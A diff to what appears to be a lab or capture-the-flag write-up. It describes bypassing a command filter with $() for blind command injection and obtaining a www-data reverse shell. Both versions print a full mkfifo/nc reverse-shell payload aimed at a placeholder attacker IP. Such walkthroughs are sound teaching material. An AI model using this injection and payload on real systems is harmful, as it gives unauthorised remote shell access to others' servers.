@@ -122,10 +122,10 @@
  
  ![image](https://github.com/user-attachments/assets/b9835310-bc20-419c-bca1-d90d3520a537)
 
-- I bypassed the filters by enclosing the linux statement with `$()` e.g `$(ls)`. To test it, I set up a listner with nc and got a payload from
+- I bypassed the filters by enclosing the linux statement with `$()` e.g `$(ls)`.Although the vulnerability is blind because we cannot have access to results of our command. To test it, I set up a listner with nc and got a payload from
 `revshells.com` to activate a reverse shell. Now we have shell access to `www-data`
 
-  Payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [Attacker'sip] [nc listener's port] >/tmp/f`
+  Payload: `$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [Attacker'sip] [nc listener's port] >/tmp/f)`
 
   ![image](https://github.com/user-attachments/assets/188f3c98-6c02-43dd-9a00-22fdc49bb057)
 
